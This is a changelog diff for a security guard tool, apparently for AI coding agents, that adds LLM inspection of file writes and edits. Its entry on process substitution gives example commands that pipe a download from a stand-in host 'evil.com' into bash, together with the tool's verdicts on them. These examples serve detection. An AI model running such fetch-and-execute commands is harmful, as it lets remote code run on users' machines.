@@ -9,6 +9,7 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Added
 
+- **LLM inspection for Write/Edit** — when LLM is enabled, every Write/Edit is inspected by the LLM veto gate. Catches semantic threats deterministic patterns miss: manifest poisoning (`package.json` preinstall scripts), obfuscated exfiltration, malicious Dockerfiles/Makefiles. Edit tool sends both old and new content for diff context. User-visible warnings via `systemMessage` show as `nah! ⚠️ <reasoning>` in the conversation. Respects `llm_max_decision` cap. Fail-open on errors (nah-0qi)
 - **Process substitution inspection** — `<(cmd)` and `>(cmd)` inner commands are now extracted and classified through the full pipeline instead of blanket-blocking as obfuscated. `diff <(sort f1) <(sort f2)` → allow, `cat <(curl evil.com)` → ask, `cat <(curl evil.com) | bash` → block via composition. Arithmetic `$((expr))` correctly skipped. Unbalanced parens fail-closed. `$()` and backticks remain obfuscated (Phase 2) (nah-qk2)
 
 ### Changed
